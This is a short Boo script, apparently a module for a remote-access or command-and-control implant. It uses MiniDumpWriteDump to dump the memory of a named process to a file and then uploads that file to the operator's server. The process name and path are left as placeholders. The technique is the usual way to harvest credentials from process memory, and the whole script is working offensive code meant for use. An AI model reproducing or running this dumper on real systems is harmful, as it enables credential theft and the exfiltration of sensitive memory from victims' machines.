import System
import System.IO
import System.Diagnostics
import System.Runtime.InteropServices

[DllImport("Dbghelp.dll", EntryPoint:"MiniDumpWriteDump")]
def minidumpwritedump(hProcess as int, ProcessId as int, hFile as int, DumpType as int, ExceptionParam as int, UserStreamParam as int, CallbackParam as int):
    pass

public static def Start(job as duck):
    procname = "PROCESS_NAME"
    file = "DUMPFILE_PATH"

    #print "[*] Dumping process: $(procname)"
    ids = Process.GetProcessesByName(procname)
    for pid in ids:
        using fs = FileStream(file, FileMode.Create, FileAccess.ReadWrite, FileShare.Write):
            minidumpwritedump(pid.Handle, pid.Id, fs.Handle, 0x00000002, 0, 0, 0)

    #print "[*] Uploading file: $(file)"
    job.Upload(file)
